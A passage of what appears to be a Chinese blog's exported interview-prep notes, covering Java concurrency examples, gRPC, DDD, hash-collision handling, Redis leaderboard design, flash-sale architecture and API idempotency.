SimpleDateFormat(\"今天是\"+\"yyyy年MM月dd日 E kk点mm分\");\n        String nowTime = simpleDateFormat.format( now );\n        try {\n            rpcDateResponse = RPCDateResponse\n                    .newBuilder()\n                    .setServerDate( \"Welcome \" + request.getUserName()  + \", \" + nowTime )\n                    .build();\n        } catch (Exception e) {\n            responseObserver.onError(e);\n        } finally {\n            responseObserver.onNext( rpcDateResponse );\n        }\n        responseObserver.onCompleted();\n    }\n}\n```\n创建GRPCServer\n```java\npublic class GRPCServer {\n    private static final int port = 9999;\n    public static void main( String[] args ) throws Exception {\n        Server server = ServerBuilder.\n                forPort(port)\n                .addService( new RPCDateServiceImpl() )\n                .build().start();\n        System.out.println( \"grpc服务端启动成功, 端口=\" + port );\n        server.awaitTermination();\n    }\n}\n```\n## 一个优秀的RPC框架需要考虑的问题\n1. `微服务化`应用都基于微服务化，实现资源调用离不开远程调用\n2. `多实例问题` 一个服务可能有多个实例，你在调用时，要如何获取这些实例的地址呢？--- 这时候就需要一个服务注册中心，从服务注册中心获取服务的实例列表，再从中选择一个进行调用。\n3. `负载均衡` 选哪个调用好呢？这时候就需要负载均衡了，于是又得考虑如何实现复杂均衡\n4. `缓存` 总不能每次调用时都去注册中心查询实例列表吧，这样效率多低呀，于是又有了缓存，有了缓存，就要考虑缓存的更新问题\n5. `异步调用` 客户端总不能每次调用完都干等着服务端返回数据吧,于是就要支持异步调用;\n    - Future实现\n6. `版本控制` 服务端的接口修改了，老的接口还有人在用，怎么办？总不能让他们都改了吧？这就需要版本控制了；\n7. `线程池` 服务端总不能每次接到请求都马上启动一个线程去处理吧？于是就需要线程池；\n8. `未处理完的请求` 服务端关闭时，还没处理完的请求怎么办？是直接结束呢，还是等全部请求处理完再关闭呢？\n\n## 什么是DDD？\n### MVC\n要说DDD，不得不先看看MVC，我相信基本上99%的java开发读者，不管你是计科专业出身还是跨专业，初学spring或者springboot的时候，接触到的代码分层都是MVC\n这说明了MVC有它自身独有的优势：\n- 开发人员可以只关注整个结构中的其中某一层；\n- 可以很容易的用新的实现来替换原有层次的实现；\n- 可以降低层与层之间的依赖；\n- 有利于标准化；\n- 利于各层逻辑的复用。\n\n但是真实情况是这样吗？随着你系统功能迭代，业务逻辑越来越复杂之后。MVC三层中，V层作为数据载体，C层作为逻辑路由都是很薄的一层，大量的代码都堆积在了M层（模型层）。一个service的类，动辄几百上千行，大的甚至几万行，逻辑嵌套复杂，主业务逻辑不清晰。service做的稍微轻量化一点的，代码就像是胶水，把数据库执行逻辑与控制返回给前端的逻辑胶在一起，主次不清晰。\n一看你的工程，类啊，代码量啊都不少，你甚至不知道如何入手去修改“屎山”一样的代码。\n\n### 那么DDD为什么可以去解决以上的问题呢？\n\nDDD核心思想是什么呢？解耦！让业务不是像炒大锅饭一样混在一起，而是一道道工序复杂的美食，都有他们自己独立的做法。\n\nDDD的价值观里面，任何业务都是某个业务领域模型的职责体现。A领域只会去做A领域的事情，A领域想去修改B领域，需要找中介（防腐层）去对B领域完成操作。我想完成一个很长的业务逻辑动作，在划分好业务边界之后，交给业务服务的编排者（应用服务）去组织业务模型（聚合）完成逻辑。\n\n这样，每个服务（领域）只会做自己业务边界内的事情，最小细粒度的去定义需求的实现。原先空空的贫血模型摇身一变变成了充血模型。原理冗长的service里面类似到处set，get值这种与业务逻辑无关的数据载体包装代码，都会被去除，进到应用服务层，你的代码就是你的业务逻辑。逻辑清晰，可维护性高！\n\n### 什么样的系统适配DDD\n中小规模的系统，本身业务体量小，功能单一，选择mvc架构无疑是最好的。 项目化交付的系统，研发周期短，一天到晚按照甲方的需求定制功能。\n\n中大规模系统，产品化模式，业务可持续迭代，可预见的业务逻辑复杂性的系统。\n\n### DDD的代码怎么做\n\n// TODO\n\n## Java实现生产者消费者\n### wait()和notify()方法的实现\n```java\npublic class Test1 {\n    private static Integer count = 0;\n    private static final Integer FULL = 10;\n    private static String LOCK = \"lock\";\n    \n    public static void main(String[] args) {\n        Test1 test1 = new Test1();\n        new Thread(test1.new Producer()).start();\n        new Thread(test1.new Consumer()).start();\n        new Thread(test1.new Producer()).start();\n        new Thread(test1.new Consumer()).start();\n        new Thread(test1.new Producer()).start();\n        new Thread(test1.new Consumer()).start();\n        new Thread(test1.new Producer()).start();\n        new Thread(test1.new Consumer()).start();\n    }\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                synchronized (LOCK) {\n                    while (count == FULL) {\n                        try {\n                            LOCK.wait();\n                        } catch (Exception e) {\n                            e.printStackTrace();\n                        }\n                    }\n                    count++;\n                    System.out.println(Thread.currentThread().getName() + \"生产者生产，目前总共有\" + count);\n                    LOCK.notifyAll();\n                }\n            }\n        }\n    }\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                synchronized (LOCK) {\n                    while (count == 0) {\n                        try {\n                            LOCK.wait();\n                        } catch (Exception e) {\n                        }\n                    }\n                    count--;\n                    System.out.println(Thread.currentThread().getName() + \"消费者消费，目前总共有\" + count);\n                    LOCK.notifyAll();\n                }\n            }\n        }\n    }\n}\n```\n### 可重入锁ReentrantLock的实现\n```java\npublic class Test2 {\n    private static Integer count = 0;\n    private static final Integer FULL = 10;\n    //创建一个锁对象\n    private Lock lock = new ReentrantLock();\n    //创建两个条件变量，一个为缓冲区非满，一个为缓冲区非空\n    private final Condition notFull = lock.newCondition();\n    private final Condition notEmpty = lock.newCondition();\n    public static void main(String[] args) {\n        Test2 test2 = new Test2();\n        new Thread(test2.new Producer()).start();\n        new Thread(test2.new Consumer()).start();\n        new Thread(test2.new Producer()).start();\n        new Thread(test2.new Consumer()).start();\n        new Thread(test2.new Producer()).start();\n        new Thread(test2.new Consumer()).start();\n        new Thread(test2.new Producer()).start();\n        new Thread(test2.new Consumer()).start();\n    }\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                //获取锁\n                lock.lock();\n                try {\n                    while (count == FULL) {\n                        try {\n                            notFull.await();\n                        } catch (InterruptedException e) {\n                            e.printStackTrace();\n                        }\n                    }\n                    count++;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"生产者生产，目前总共有\" + count);\n                    //唤醒消费者\n                    notEmpty.signal();\n                } finally {\n                    //释放锁\n                    lock.unlock();\n                }\n            }\n        }\n    }\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e1) {\n                    e1.printStackTrace();\n                }\n                lock.lock();\n                try {\n                    while (count == 0) {\n                        try {\n                            notEmpty.await();\n                        } catch (Exception e) {\n                            e.printStackTrace();\n                        }\n                    }\n                    count--;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"消费者消费，目前总共有\" + count);\n                    notFull.signal();\n                } finally {\n                    lock.unlock();\n                }\n            }\n        }\n    }\n}\n```\n#### 阻塞队列BlockingQueue的实现\n```java\npublic class Test3 {\n    private static Integer count = 0;\n    //创建一个阻塞队列\n    final BlockingQueue blockingQueue = new ArrayBlockingQueue<>(10);\n    public static void main(String[] args) {\n        Test3 test3 = new Test3();\n        new Thread(test3.new Producer()).start();\n        new Thread(test3.new Consumer()).start();\n        new Thread(test3.new Producer()).start();\n        new Thread(test3.new Consumer()).start();\n        new Thread(test3.new Producer()).start();\n        new Thread(test3.new Consumer()).start();\n        new Thread(test3.new Producer()).start();\n        new Thread(test3.new Consumer()).start();\n    }\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                try {\n                    blockingQueue.put(1);\n                    count++;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"生产者生产，目前总共有\" + count);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e1) {\n                    e1.printStackTrace();\n                }\n                try {\n                    blockingQueue.take();\n                    count--;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"消费者消费，目前总共有\" + count);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```\n#### 信号量Semaphore的实现\n```java\npublic class Test4 {\n    private static Integer count = 0;\n    //创建三个信号量\n    final Semaphore notFull = new Semaphore(10);\n    final Semaphore notEmpty = new Semaphore(0);\n    final Semaphore mutex = new Semaphore(1);\n    public static void main(String[] args) {\n        Test4 test4 = new Test4();\n        new Thread(test4.new Producer()).start();\n        new Thread(test4.new Consumer()).start();\n        new Thread(test4.new Producer()).start();\n        new Thread(test4.new Consumer()).start();\n        new Thread(test4.new Producer()).start();\n        new Thread(test4.new Consumer()).start();\n        new Thread(test4.new Producer()).start();\n        new Thread(test4.new Consumer()).start();\n    }\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                try {\n                    notFull.acquire();\n                    mutex.acquire();\n                    count++;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"生产者生产，目前总共有\" + count);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    mutex.release();\n                    notEmpty.release();\n                }\n            }\n        }\n    }\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; i++) {\n                try {\n                    Thread.sleep(3000);\n                } catch (InterruptedException e1) {\n                    e1.printStackTrace();\n                }\n                try {\n                    notEmpty.acquire();\n                    mutex.acquire();\n                    count--;\n                    System.out.println(Thread.currentThread().getName()\n                            + \"消费者消费，目前总共有\" + count);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    mutex.release();\n                    notFull.release();\n                }\n            }\n        }\n    }\n}\n\n```\n## Java实现BlockQueue\n```java\npublic class BlockingQueue<E> {\n\n    /**\n     * 有界队列内部固定长度，因此可以用数组实现\n     */\n    private Object[] elements;\n\n    /**\n     * 队列的头和尾下标\n     */\n    private int head = 0, tail = 0;\n\n    /**\n     * 队列目前的长度\n     */\n    private int size;\n    private ReentrantLock lock = new ReentrantLock();\n    private Condition notEmpty = lock.newCondition();\n    private Condition notFull = lock.newCondition();\n\n    public BlockingQueue(int capacity) {\n        this.elements = new Object[capacity];\n    }\n\n    public void put(E e) {\n        lock.lock();\n        try {\n            while (size == elements.length)\n                notFull.await();\n            elements[tail] = e;\n            if (++tail == elements.length) {\n                tail = 0;\n            }\n            size++;\n            notEmpty.signal();\n\n        } catch (InterruptedException ex) {\n            ex.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public E take() {\n        lock.lock();\n        E e = null;\n        try {\n            while (size == 0) {\n                notEmpty.await();\n            }\n            e = (E) elements[head];\n            elements[head] = null;\n            if (++head == elements.length)\n                head = 0;\n            size--;\n            notFull.signal();\n\n        } catch (InterruptedException ex) {\n            ex.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n        return e;\n    }\n\n    public int size() {\n        lock.lock();\n        try {\n            return size;\n        } finally {\n            lock.unlock();\n        }\n    }\n}\n```\n\n## 解决哈希冲突的方法\n### 开放定址法\n从发生冲突的那个单元起，按照一定的次序，从哈希表中找到一个空闲的单元。然后把发生冲突的元素存入到该单元的一种方法。开放定址法需要的表长度要大于等于所需要存放的元素。\n\n在开放定址法中解决冲突的方法有：线行探查法、平方探查法、双散列函数探查法。\n\n开放定址法的缺点在于删除元素的时候不能真的删除，否则会引起查找错误，只能做一个特殊标记。只到有下个元素插入才能真正删除该元素。\n\n#### 线行探查法\n线行探查法是开放定址法中最简单的冲突处理方法，它从发生冲突的单元起，依次判断下一个单元是否为空，当达到最后一个单元时，再从表首依次判断。直到碰到空闲的单元或者探查完全部单元为止。\n\n可以参考csdn上flash对该方法的演示：\nhttp://student.zjzk.cn/course_ware/data_structure/web/flash/cz/kfdzh.swf\n\n#### 平方探查法\n平方探查法即是发生冲突时，用发生冲突的单元d[i], 加上 1²、 2²等。即d[i] + 1²，d[i] + 2², d[i] + 3²…直到找到空闲单元。\n\n在实际操作中，平方探查法不能探查到全部剩余的单元。不过在实际应用中，能探查到一半单元也就可以了。若探查到一半单元仍找不到一个空闲单元，表明此散列表太满，应该重新建立。\n\n#### 双散列函数探查法\n这种方法使用两个散列函数hl和h2。其中hl和前面的h一样，以关键字为自变量，产生一个0至m—l之间的数作为散列地址；h2也以关键字为自变量，产生一个l至m—1之间的、并和m互素的数(即m不能被该数整除)作为探查序列的地址增量(即步长)，探查序列的步长值是固定值l；对于平方探查法，探查序列的步长值是探查次数i的两倍减l；对于双散列函数探查法，其探查序列的步长值是同一关键字的另一散列函数的值。\n\n### 链地址法（拉链法）\n链接地址法的思路是将哈希值相同的元素构成一个同义词的单链表，并将单链表的头指针存放在哈希表的第i个单元中，查找、插入和删除主要在同义词链表中进行。链表法适用于经常进行插入和删除的情况。\n\n如下一组数字,(32、40、36、53、16、46、71、27、42、24、49、64)哈希表长度为13，哈希函数为H(key)=key%13,则链表法结果如下：\n```java\n0       \n1  -> 40 -> 27 -> 53 \n2\n3  -> 16 -> 42\n4\n5\n6  -> 32 -> 71\n7  -> 46\n8\n9\n10 -> 36 -> 49\n11 -> 24\n12 -> 64\n```\n注：在java中，链接地址法也是HashMap解决哈希冲突的方法之一，jdk1.7完全采用单链表来存储同义词，jdk1.8则采用了一种混合模式，对于链表长度大于8的，会转换为红黑树存储。\n\n### 再哈希法\n就是同时构造多个不同的哈希函数：\n\nHi = RHi(key)   i= 1,2,3 … k;\n\n当H1 = RH1(key)  发生冲突时，再用H2 = RH2(key) 进行计算，直到冲突不再产生，这种方法不易产生聚集，但是增加了计算时间。\n\n### 建立公共溢出区\n将哈希表分为公共表和溢出表，当溢出发生时，将所有溢出数据统一放到溢出区。\n\n## 排行榜设计\n### 基于数据库\n基于MySQL，order by\n\n缺点：\n- 速度慢\n### 基于Redis\n主要考察sort set 也就是zset\n\nzadd添加数据后，zrevrange获取排序后的排名\n\n### 类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样\nkey的设计比较重要，比如aa用户和bb用户\n```shell\nzadd step:aa 1000 小明\nzadd step:bb 1000 小明\n```\n\n同理时间也可以通过key的设计解决\n```shell\nzadd step:aa:20210929 1000 小明\nzadd step:aa:20210929 1000 小明\n```\n\n但是上述设计会导致每个用户都有一个排行榜，存储的数据巨大，其实可以考虑只在用户查询时通过好友关系去生成\n\n那朋友圈排行榜的：微信头像、点赞数 怎么获取呢\n- 可以使用hmset hash储存对象，需要时通过zset储存的key去查询即可\n\n### 最近七天排行榜怎么弄\n前面我们说的都是每日排行榜。\n\n假设面试官要求我们提供一个最近七天、上一周、上一月、上个季度、这一年排行榜啥的，又该怎么搞呢？\n\n其实这还是在考察你对于 Redis 有序集合 API 的掌握程度。\n\n也就是这个 API：\n- zinterstore/zunionstore destination numkeys key [key ...] [weights weight [weight ...]] [aggregate sum|min|max] 获取交集/并集\n    - zinterstore/zunionstore其实就是交集/并集\n    - destination 将交集/并集的结果保存到这个键中\n    - numkeys 需要做交集/并集的集合的个数\n    - key [key ...] 具体参与交集/并集的集合\n    - weights weight [weight ...] 每个参与计算的集合的权重。在做交集/并集计算时，每个集合中的 member 会把自己的 score 乘以这个权重，默认为 1。\n    - aggregate sum|min|max 对于各个集合中的相同元素是 sum(求和)、min(取最小值)还是max(取最大值)，默认为 sum。\n\n比如现在有一些数据\n```shell\nzadd sport:ranking:why:20210222 43243 why 2341 mx 8764 les 42321 skr\nzadd sport:ranking:why:20210223 57632 why 24354 mx 4231 les 43512 skr 5341 jay\nzadd sport:ranking:why:20210224 10026 why 12344 mx 54312 les 34531 skr 43512 jay\nzadd sport:ranking:why:20210225 54312 why 32451 mx 23412 les 21341 skr 56321 jay\nzadd sport:ranking:why:20210226 3212 why 63421 mx 53652 les 45621 skr 5723 jay\nzadd sport:ranking:why:20210227 5462 why 10158 mx 30169 les 48858 skr 66079 jay\nzadd sport:ranking:why:20210228 43553 why 4451 mx 7431 les 9563 skr 8232 jay\n```\n![](./2024/05/26/场景设计面试题/10.png)\n\n现在我们要求出最近 7 天的排行榜，就用下面这行命令，命令有点复杂，但是对着命令格式看，还是很清晰的：\n```shell\nzunionstore sport:ranking:why:last_seven_day 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum\n```\n![](./2024/05/26/场景设计面试题/11.png)\n\n上面用的是并集，如果我们的要求是对最近 7 天，每天都上传运动数据的人进行排序，就用交集来算。\n\n命令和上面的一致，只是把 zunionstore 修改为 zinterstore 即可。\n\n另外为了有对比，合并之后的队列名称也修改一下，命令如下：\n```shell\nzinterstore sport:ranking:why:last_seven_day_zinterstore 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum\n```\n![](./2024/05/26/场景设计面试题/12.png)\n\n知道最近 7 天的做法了，我们又有每一天数据，上一周、上一月、上个季度、这一年排行榜啥的不都是这个套路吗\n\n### 亿级用户排行榜\n\n#### 按段位分桶\n由于数据量比较大，所以需要类似于分成一个个小文件的思想去统计每一部分的数据\n\n比如游戏里的段位，统计国服前100，可以把王者、大师、砖石、铂金、黄金、白银、青铜 分为不同的桶，每个分段的人在不同的桶里(假设还是用zset存储用户的段位)\n那计算全服排名即可先计算在某个段位桶的排名x,再获取这个段位桶前的所有桶的大小y1,y2...yn，排名就计算出来了x+y1+y2....yn\n##### 计算top100\n分桶后，直接在段位最大的桶里计算top100即可\n#### 按积分分桶\n[0-5000] [5001-10000] .....[10000000-x]\n\n这种可能会出现热点问题，比如处于0-5000区间的人会非常多（可能很多人都是没有打排位）用户的落点其实并不是均匀的，那就需要通过其他预测算法去预估每个区间的人数了\n\n\n\n","slug":"场景设计面试题","published":1,"updated":"2024-05-26T15:19:59.123Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryx002obsuh2dkx06g6","content":"<h2 id=\"有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号-姓名，而B文件存放学号-分数，要求生成文件C，存放姓名和分数。怎么实现？\"><a href=\"#有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号-姓名，而B文件存放学号-分数，要求生成文件C，存放姓名和分数。怎么实现？\" class=\"headerlink\" title=\"有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号+姓名，而B文件存放学号+分数，要求生成文件C，存放姓名和分数。怎么实现？\"></a>有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号+姓名，而B文件存放学号+分数，要求生成文件C，存放姓名和分数。怎么实现？</h2><ul>\n<li>hash(学号)%1000，A到a0….a1000,B到b0~b1000</li>\n<li>学号相同的人一定hash到相同序号的小文件</li>\n<li>加载序号相同的小文件（比如：读取a2和b2）用map储存再按姓名+分数写入C即可</li>\n</ul>\n<h2 id=\"秒杀系统怎么设计\"><a href=\"#秒杀系统怎么设计\" class=\"headerlink\" title=\"秒杀系统怎么设计\"></a>秒杀系统怎么设计</h2><h3 id=\"秒杀存在的问题\"><a href=\"#秒杀存在的问题\" class=\"headerlink\" title=\"秒杀存在的问题\"></a>秒杀存在的问题</h3><ul>\n<li>高并发、瞬间请求量极大</li>\n<li>黄牛、黑客恶意请求</li>\n<li>链接暴露问题</li>\n<li>数据库压力问题</li>\n<li>库存不足和超卖问题</li>\n</ul>\n<h3 id=\"如何解决这些问题\"><a href=\"#如何解决这些问题\" class=\"headerlink\" title=\"如何解决这些问题\"></a>如何解决这些问题</h3><ul>\n<li>页面静态化<ul>\n<li>秒杀活动的页面，大多数内容都是固定不变的，如商品名称，商品图片等等，可以对活动页面做静态化处理，减少访问服务端的请求。秒杀用户会分布在全国各地，有的在上海，有的在深圳，地域相差很远，网速也各不相同。为了让用户最快访问到活动页面，可以使用CDN（Content Delivery Network，内容分发网络）。CDN可以让用户就近获取所需内容。</li>\n</ul>\n</li>\n<li>按钮至灰控制<ul>\n<li>秒杀活动开始前，按钮一般需要置灰的。只有时间到了，才能变得可以点击。这是防止，秒杀用户在时间快到的前几秒，疯狂请求服务器，然后秒杀时间点还没到，服务器就自己挂了。</li>\n</ul>\n</li>\n<li>服务单一职责<ul>\n<li>我们都知道微服务设计思想，也就是把各个功能模块拆分，功能那个类似的放一起，再用分布式的部署方式。</li>\n<li>如用户登录相关的，就设计个用户服务，订单相关的就搞个订单服务，再到礼物相关的就搞个礼物服务等等。那么，秒杀相关的业务逻辑也可以放到一起，搞个秒杀服务，单独给它搞个秒杀数据库。</li>\n<li>服务单一职责有个好处：如果秒杀没抗住高并发的压力，秒杀库崩了，服务挂了，也不会影响到系统的其他服务。</li>\n</ul>\n</li>\n<li>秒杀链接加盐<ul>\n<li>链接如果明文暴露的话，会有人获取到请求Url，提前秒杀了。因此，需要给秒杀链接加盐。可以把URL动态化，如通过MD5加密算法加密随机的字符串去做url。</li>\n</ul>\n</li>\n<li>限流<ul>\n<li>一般有两种方式限流：nginx限流和redis限流。</li>\n<li>为了防止某个用户请求过于频繁，我们可以对同一用户限流；</li>\n<li>为了防止黄牛模拟几个用户请求，我们可以对某个IP进行限流；</li>\n<li>为了防止有人使用代理，每次请求都更换IP请求，我们可以对接口进行限流。</li>\n<li>为了防止瞬时过大的流量压垮系统，还可以使用阿里的Sentinel、Hystrix组件进行限流。</li>\n</ul>\n</li>\n<li>分布式锁<ul>\n<li>可以使用redis分布式锁解决超卖问题。</li>\n<li>使用Redis的SET EX PX NX + 校验唯一随机值,再删除释放锁。</li>\n<li>为了更严谨，一般也是用lua脚本代替。lua脚本如下：</li>\n</ul>\n</li>\n<li>MQ异步处理<ul>\n<li>如果瞬间流量特别大，可以使用消息队列削峰，异步处理。用户请求过来的时候，先放到消息队列，再拿出来消费。</li>\n</ul>\n</li>\n<li>限流&amp;降级&amp;熔断<ul>\n<li>限流，就是限制请求，防止过大的请求压垮服务器；</li>\n<li>降级，就是秒杀服务有问题了，就降级处理，不要影响别的服务；</li>\n<li>熔断，服务有问题就熔断，一般熔断降级是一起出现。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"产品上线出问题怎么定位错误\"><a href=\"#产品上线出问题怎么定位错误\" class=\"headerlink\" title=\"产品上线出问题怎么定位错误\"></a>产品上线出问题怎么定位错误</h2><ul>\n<li>复现问题</li>\n<li>top jstack</li>\n</ul>\n<h2 id=\"大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案\"><a href=\"#大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案\" class=\"headerlink\" title=\"大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案\"></a>大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案</h2><p>读写分离</p>\n<h2 id=\"海量日志数据，提取出某日访问百度次数最多的那个IP。\"><a href=\"#海量日志数据，提取出某日访问百度次数最多的那个IP。\" class=\"headerlink\" title=\"海量日志数据，提取出某日访问百度次数最多的那个IP。\"></a>海量日志数据，提取出某日访问百度次数最多的那个IP。</h2><ul>\n<li>可以考虑采用“分而治之”的思想，按照IP地址的Hash(IP)%1024值，把海量IP日志分别存储到1024个小文件中。这样，每个小文件最多包含4MB个IP地址</li>\n<li>对于每一个小文件，可以构建一个IP为key，出现次数为value的Hash map，同时记录当前出现次数最多的那个IP地址</li>\n<li>可以得到1024个小文件中的出现次数最多的IP，再依据常规的排序算法得到总体上出现次数最多的IP；</li>\n</ul>\n<h2 id=\"给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？\"><a href=\"#给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？\" class=\"headerlink\" title=\"给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？\"></a>给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？</h2><h3 id=\"方案1\"><a href=\"#方案1\" class=\"headerlink\" title=\"方案1\"></a>方案1</h3><ul>\n<li>遍历文件a，对每个url求取hash(url)%1000，然后根据所取得的值将url分别存储到1000个小文件（记为a0,a1,…,a999）中。这样每个小文件的大约为300M。</li>\n<li>遍历文件b，采取和a相同的方式将url分别存储到1000小文件（记为b0,b1,…,b999）。这样处理后，所有可能相同的url都在对应的小文件（a0vsb0,a1vsb1,…,a999vsb999）中，不对应的小文件不可能有相同的url。然后我们只要求出1000对小文件中相同的url即可。</li>\n<li>求每对小文件中相同的url时，可以把其中一个小文件的url存储到hash_set中。然后遍历另一个小文件的每个url，看其是否在刚才构建的hash_set中，如果是，那么就是共同的url，存到文件里面就可以了。</li>\n</ul>\n<h3 id=\"方案2\"><a href=\"#方案2\" class=\"headerlink\" title=\"方案2\"></a>方案2</h3><p>如果允许有一定的误差，使用布隆过滤器</p>\n<h2 id=\"一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash-x-1000分为小文件再分别加载小文件到内存中处理即可\"><a href=\"#一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash-x-1000分为小文件再分别加载小文件到内存中处理即可\" class=\"headerlink\" title=\"一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash(x)%1000分为小文件再分别加载小文件到内存中处理即可\"></a>一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash(x)%1000分为小文件再分别加载小文件到内存中处理即可</h2><h2 id=\"如何保证接口的幂等性\"><a href=\"#如何保证接口的幂等性\" class=\"headerlink\" title=\"如何保证接口的幂等性\"></a>如何保证接口的幂等性</h2><h3 id=\"什么是幂等性\"><a href=\"#什么是幂等性\" class=\"headerlink\" title=\"什么是幂等性\"></a>什么是幂等性</h3><p>幂等性是系统服务对外一种承诺，承诺只要调用接口成功，外部多次调用对系统的影响是一致的。声明为幂等的服务会认为外部调用失败是常态，并且失败之后必然会有重试。</p>\n<h3 id=\"什么情况下需要幂等\"><a href=\"#什么情况下需要幂等\" class=\"headerlink\" title=\"什么情况下需要幂等\"></a>什么情况下需要幂等</h3><p>以SQL为例：</p>\n<ul>\n<li>SELECT col1 FROM tab1 WHER col2&#x3D;2，无论执行多少次都不会改变状态，是天然的幂等。</li>\n<li>UPDATE tab1 SET col1&#x3D;1 WHERE col2&#x3D;2，无论执行成功多少次状态都是一致的，因此也是幂等操作。</li>\n<li>UPDATE tab1 SET col1&#x3D;col1+1 WHERE col2&#x3D;2，每次执行的结果都会发生变化，这种不是幂等的。</li>\n<li>insert into user(userid,name) values(1,’a’) 如userid为唯一主键，即重复操作上面的业务，只会插入一条用户数据，具备幂等性。<ul>\n<li>如userid不是主键，可以重复，那上面业务多次操作，数据都会新增多条，不具备幂等性。</li>\n</ul>\n</li>\n<li>delete from user where userid&#x3D;1，多次操作，结果一样，具备幂等性</li>\n</ul>\n<h3 id=\"如何保证幂等\"><a href=\"#如何保证幂等\" class=\"headerlink\" title=\"如何保证幂等\"></a>如何保证幂等</h3><h4 id=\"1、token机制\"><a href=\"#1、token机制\" class=\"headerlink\" title=\"1、token机制\"></a>1、token机制</h4><ul>\n<li>服务端提供了发送token的接口。我们在分析业务的时候，哪些业务是存在幂等问题的，就必须在执行业务前，先去获取token，服务器会把token保存到redis中。</li>\n<li>然后调用业务接口请求时，把token携带过去，一般放在请求头部。</li>\n<li>服务器判断token是否存在redis中，存在表示第一次请求，然后删除token,继续执行业务。</li>\n<li>如果判断token不存在redis中，就表示是重复操作，直接返回重复标记给client，这样就保证了业务代码，不被重复执行。</li>\n</ul>\n<p><strong>关键点 先删除token，还是后删除token。</strong></p>\n<p>后删除token：如果进行业务处理成功后，删除redis中的token失败了，这样就导致了有可能会发生重复请求，因为token没有被删除。这个问题其实是数据库和缓存redis数据不一致问题，后续会写文章进行讲解。</p>\n<p>先删除token：如果系统出现问题导致业务处理出现异常，业务处理没有成功，接口调用方也没有获取到明确的结果，然后进行重试，但token已经删除掉了，服务端判断token不存在，认为是重复请求，就直接返回了，无法进行业务处理了。</p>\n<p>先删除token可以保证不会因为重复请求，业务数据出现问题。出现业务异常，可以让调用方配合处理一下，重新获取新的token，再次由业务调用方发起重试请求就ok了。</p>\n<p><strong>token机制缺点</strong></p>\n<p>业务请求每次请求，都会有额外的请求（一次获取token请求、判断token是否存在的业务）。其实真实的生产环境中，1万请求也许只会存在10个左右的请求会发生重试，为了这10个请求，我们让9990个请求都发生了额外的请求。</p>\n<h4 id=\"2、乐观锁机制\"><a href=\"#2、乐观锁机制\" class=\"headerlink\" title=\"2、乐观锁机制\"></a>2、乐观锁机制</h4><ul>\n<li>这种方法适合在更新的场景中，update t_goods set count &#x3D; count -1 , version &#x3D; version + 1 where good_id&#x3D;2 and version &#x3D; 